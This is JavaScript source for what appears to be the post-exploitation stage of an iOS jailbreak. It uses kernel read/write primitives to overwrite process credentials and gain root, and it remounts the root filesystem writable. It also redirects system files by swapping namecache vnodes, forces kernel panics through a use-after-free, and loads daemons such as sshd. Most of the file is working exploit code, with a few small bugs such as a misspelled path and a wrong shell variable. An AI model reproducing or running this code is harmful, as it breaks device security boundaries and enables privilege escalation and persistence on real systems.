
function remount_rootfs() {
    if (sys.access(util.cstr("/"), R_OK|W_OK) == 0) return 0;
    var dev = util.cstr("/dev/disk0s1s1");
    var dev_ptr = util.create_data_buf(0x4);
    dev_ptr.write(0x0, dev, 0x4);
    
    var status = sys.mount(util.cstr("hfs"), util.cstr("/"), MNT_UPDATE, dev_ptr.addr);
    if (status != 0) return status;
    
    sys.thread_switch(sys.mach_thread_self(), 2, 250);
    return sys.access(util.cstr("/"), R_OK|W_OK);
}

function vnode_for_path(path) {
    var fd = sys.open(util.cstr(path), O_RDONLY);
    if (fd < 0) return 0;

    sys.thread_switch(sys.mach_thread_self(), 2, 10);
    sys.sync();

    var p_fd = kread32(kinfo.self_proc_addr + koffsetof('proc', 'p_fd'));
    if (p_fd == 0) return 0;

    var fd_ofiles = kread32(p_fd + koffsetof('file_desc', 'fd_ofiles'));
    if (fd_ofiles == 0) return 0;

    var fproc = kread32(fd_ofiles + util.u32(fd * 0x4));
    if (fproc == 0) return 0;

    var f_fglob = kread32(fproc + koffsetof('file_proc', 'f_fglob'));
    if (f_fglob == 0) return 0;

    var vnode = kread32(f_fglob + koffsetof('file_glob', 'fg_data'));
    return util.u32(vnode);
}

function namecache_swap_vnode(target, replacement) {
    var target_vnode = vnode_for_path(target);
    if (target_vnode == 0) return -1;

    var replacement_vnode = vnode_for_path(replacement);
    if (replacement_vnode == 0) return -1;

    var namecache = kread32(target_vnode + koffsetof('vnode', 'namecache'));
    if (namecache == 0) return -1;

    var target_count = util.u32(kread32(target_vnode + koffsetof('vnode', 'kusecount')) + 10);
    var replacement_count = util.u32(kread32(replacement_vnode + koffsetof('vnode', 'kusecount')) + 10);

    kwrite32(target_vnode + koffsetof('vnode', 'kusecount'), target_count);
    kwrite32(replacement_vnode + koffsetof('vnode', 'kusecount'), replacement_count);
    kwrite32(namecache + koffsetof('namecache', 'vnode'), replacement_vnode);

    sys.thread_switch(sys.mach_thread_self(), 2, 10);
    sys.sync();
    return 0;
}

function set_permissions() {
    var self_ucred = kread32(kinfo.self_proc_addr + koffsetof('proc', 'ucred'));
    var kern_ucred = kread32(kinfo.kern_proc_addr + koffsetof('proc', 'ucred'));
    
    for (var i = 0; i < 20; i++) {
        kwrite32(self_ucred + 0xc, 0);
        kwrite32(self_ucred + 0x10, 0);
        kwrite32(self_ucred + 0x14, 0);
        kwrite32(self_ucred + 0x1c, 0);
        kwrite32(self_ucred + 0x5c, 0);
        
        sys.setuid(0);
        sys.setgid(0);
        sys.seteuid(0);
        sys.setegid(0);
        sys.setrgid(0);
        sys.setrgid(0);
        kwrite32(kinfo.self_proc_addr + koffsetof('proc', 'ucred'), kern_ucred);
        sys.thread_switch(sys.mach_thread_self(), 2, 100);
        
        sys.setuid(0);
        sys.setgid(0);
        sys.seteuid(0);
        sys.setegid(0);
        sys.setrgid(0);
        sys.setrgid(0);
        if (sys.getuid() == 0 && sys.getgid() == 0) return 0;
    }
    return -1;
}

function run_binary(path, args) {
    if (sys.access(util.cstr(path), F_OK) != 0) return 2;
    if (args == undefined) {
        args = [path];
    } else {
        args.splice(0, 0, path);
    }

    var argc = args.length;
    var argv = util.create_data_buf((argc * 0x4) + 0x4);
    for (var i = 0; i < argc; i++) {
        argv.write((i*0x4), util.cstr(args[i]), 0x4);
    }
    
    var env = util.create_data_buf(0x8);
    env.write(0x0, util.cstr("PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin"), 0x4);
    mem.write32(mem.scratch + 0x100, 0);
    mem.write32(mem.scratch + 0x104, 0);

    var status = sys.posix_spawn(mem.scratch + 0x100, util.cstr(path), nullptr, argv.addr, env.addr);
    var pid = mem.read32(mem.scratch + 0x100);
    if (status != 0 || pid <= 0) return -1;
    
    while (true) {
        if (util.u32(sys.waitpid(pid, mem.scratch + 0x104, 0)) == util.u32(0xffffffff)) {
            return mem.read32(mem.scratch + 0x104);
        }
        
        status = util.u32(mem.read32(mem.scratch + 0x104));
        var w_status = util.u32(status & 0x7F);

        if (w_status == util.u32(0)) return status; // WIFEXITED
        if (w_status != util.u32(0x7F) && w_status != util.u32(0)) return status; // WIFSIGNALED
    }
}

function launchctl(cmd, path) {
    return run_binary("/bin/launchctl", [cmd, path]);
}

function killall(name) {
    return run_binary("/usr/bin/killall", [name]);
}

function reboot() {
    sys.reboot(0);
    for (var i = 0; i < 10; i++) {
        sys.thread_switch(sys.mach_thread_self(), 2, 100);
        sys.sync();
    }

    // force panic (method 1)
    if (kinfo.oob_entry > 1 && kinfo.mapping_base != 0) {
        var mapped = map_data(0x80004000, 0x10000, VM_PROT_READ | VM_PROT_WRITE);
        if (mapped != nullptr) {
            for (i = 0; i < 0x10000; i+=0x4) {
                mem.write32(mapped + i, 0x41414141);
            }

            unmap_data(mapped, 0x10000);
            for (i = 0; i < 10; i++) {
                sys.thread_switch(sys.mach_thread_self(), 2, 100);
                sys.sync();
            }
        }
    }

    // force panic (method 2)
    var pktinfo = util.create_data_buf(20);
    if (uaf_primitive(0x41414141, false, pktinfo.addr) != 0) {
        pktinfo.write(0x10, 0x2, 0x4);
        uaf_primitive(0x13371337, true, pktinfo.addr)
    }

    // force panic (method 3)
    sys.kill(1, 9);
    sys.kill(1, 15);

    for (i = 0; i < 100; i++) {
        sys.thread_switch(sys.mach_thread_self(), 2, 100);
        sys.sync();
    }
    sys.exit(41);
}

function load_daemons() {
    launchctl("enable", "system/com.apple.locationd");
    launchctl("enable", "system/com.apple.BTServer");
    launchctl("enable", "system/com.apple.assertiond");
    launchctl("enable", "system/com.apple.backboardd");
    launchctl("enable", "system/com.apple.SpringBoard");

    run_binary("/usr/libexec/substrate");
    launchctl("unload", "/Library/LaunchDaemons/com.openssh.sshd.plist");
    launchctl("load", "/Library/LaunchDaemons");
    killall("SpringBoard");
    killall("installd");

    launchctl("unload", "/System/Lisbrary/NanoLaunchDaemons");
    launchctl("load", "/System/Library/NanoLaunchDaemons");
    launchctl("load", "/System/Library/LaunchDaemons");

    run_binary("/usr/libexec/sshd-keygen-wrapper");
    run_binary("/bin/bash", ["-c",`
        ls /Library/LaunchDaemons | while read item;
            do launchctl load /Library/LaunchDaemons/$item;
        done;
        
        ls /etc/rc.d | while read item;
            do /etc/rc.d/$a;
        done;
    `]);
}

function jailbreak() {
    if (run_exploit() != 0) return -1;
    if (apply_patches() != 0) return -1;
    if (set_permissions() != 0) return -1;
    if (remount_rootfs() != 0) return -1;
    return 0;
}

function main() {
    dyld.init();
    util.init();
    mem.init();
    
    if (jailbreak() != 0) {
        reboot();
        sys.exit(1);
        return -1;
    }

    namecache_swap_vnode("/var/db/com.apple.xpc.launchd/disabled.plist", "/var/db/com.apple.xpc.launchd/disabled_orig.plist");
    namecache_swap_vnode("/usr/libexec/wifiFirmwareLoaderLegacy", "/usr/libexec/wifiFirmwareLoaderLegacy_orig");
    run_binary("/usr/libexec/wifiFirmwareLoaderLegacy_orig");

    load_daemons();
    if (info.use_dhcpd) {
        killall("racoon");
        killall("dhcpd");
    }

    sys.exit(0);
    return 0;
}
main();
